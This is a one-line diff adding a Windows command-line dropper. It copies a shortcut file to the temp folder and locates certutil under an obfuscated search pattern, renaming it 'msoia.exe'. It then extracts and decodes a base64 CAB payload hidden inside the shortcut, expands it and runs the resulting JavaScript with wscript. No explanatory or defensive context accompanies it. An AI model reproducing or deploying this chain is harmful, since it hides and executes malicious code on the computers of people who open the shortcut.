@@ -1,0 +1,1 @@
+cmd /c copy "higaisia.lnk" %tmp%\\abc.tmp /y & for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y & findstr.exe "TVNDRgAAAA" %tmp%\\abc.tmp > %tmp%\\def.tmp & %tmp%\\msoia.exe -decode %tmp%\def.tmp %tmp%\\ghi.tmp & expand %tmp%\\ghi.tmp -F:* %tmp% & wscript %tmp%\\higaisia.js
